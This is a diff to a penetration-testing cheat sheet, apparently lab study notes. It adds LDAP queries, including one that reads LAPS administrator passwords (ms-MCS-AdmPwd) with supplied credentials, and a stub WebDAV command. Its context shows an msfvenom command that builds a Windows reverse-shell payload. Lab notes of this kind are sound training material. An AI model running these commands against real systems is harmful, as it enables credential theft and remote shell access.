@@ -29,6 +29,7 @@
     - [MSSQL](#mssql)
   - [ExploitDB](#exploitdb)
   - [shellcode](#shellcode)
+  - [Webdav](#webdav)
 - [Phishing](#phishing)
 - [Foothold](#foothold)
   - [Linux](#linux-1)
@@ -194,7 +195,8 @@ enumdomusers
 ## LDAP
 https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap
 ```bash
-ldapsearch -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.215.122" "(objectclass=*)"
+ldapsearch -x -v -b "DC=hutch,DC=offsec" -H "ldap://192.168.215.122" "(objectclass=*)"
+ldapsearch -x -v -b "DC=hutch,DC=offsec" -D "user@hutch.offsec" -w pass -H "ldap://192.168.215.122" "(ms-MCS-AdmPwd=*)"
 ```
 
 ## Web
@@ -395,6 +397,10 @@ searchsploit -m 42031
 https://shell-storm.org/shellcode/index.html
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.4 LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d\x25\x26\x2b\x3d" -f python 
+```
+## Webdav
+```bash
+cadaver http://
 ```
 
 # Phishing
